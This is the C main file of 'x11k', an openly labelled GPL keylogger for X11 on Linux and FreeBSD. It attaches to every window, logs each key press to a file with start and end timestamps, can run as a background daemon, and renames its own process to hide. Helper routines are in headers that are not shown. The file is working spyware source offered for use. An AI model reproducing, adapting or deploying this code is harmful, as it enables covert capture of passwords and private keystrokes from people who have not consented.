/*
 * x11k - Keylogger for POSIX systems (linux, freebsd) with X11
 *
 * Copyright (C) 2016  xdevelnet (xdevelnet at xdevelnet dot org)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define _BSD_SOURCE // usleep()
#define _POSIX_SOURCE // kill(2)
#define _XOPEN_SOURCE // for shmem

#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <iso646.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <string.h>

#include "defaults.h"
#include "shmemroutines.h"
#include "utils.h"
#include "x11routines.h"

int main (int argc, char **argv) {
	static struct required_info_t required_info; //here can be stored filename and mode number
	get_new_process_name(FANCY_PROCESS_NAME, argv);
	check_cli_and_flush_data(argc, argv, &required_info);
	if (required_info.mode == MODE_BACKGROUND) daemonize();
	FILE *filestream = preparefile(&required_info);
	if (required_info.mode == MODE_COMMAND) perform_mode_command(&required_info); //todo

	Display *display = getdisplay();
	XEvent event;
	catch_all_windows(DefaultRootWindow(display), True, display);
	handle_posix_signals();
	fprintf(filestream, "Capture started at: %s\n\n", getdatetimestring());

	while(forever) {
		XNextEvent(display, &event);
		if (event.type == KeyPress) print_key_with_fancy_way(filestream, event.xbutton.button);
		if (event.type == CreateNotify) {
			if (event.xcreatewindow.override_redirect == 1) continue; // ignore popups
			if (event.xcreatewindow.x < 0) continue; // ignore weird windows
			usleep(10000);
			catch_all_windows(DefaultRootWindow(display), True, display);
			// Kludge! check "good but not working" solution below.
			// I make this because:
			//     1) Some windows are creating with some specifically-weird way, like Xterm, which cause crash.
			//     2) Almost all new windows can't be captured without any error.
			//     3) Bad but working solution still better than elegant but not working.
		}
		if (event.type == KeyRelease and (event.xbutton.button == 50 or event.xbutton.button == 62)) shift_is_pressed = 0;
		//if (event.type == CreateNotify) addwindow(&event, display);
		if (we_need_to_stop == 1) break;
	}

	XCloseDisplay(display);
	fprintf(filestream, "\n\nCapture finished at: %s\n\n", getdatetimestring());
	fflush(filestream);
	fclose(filestream);
	remove_shmem();
	return EXIT_SUCCESS;
}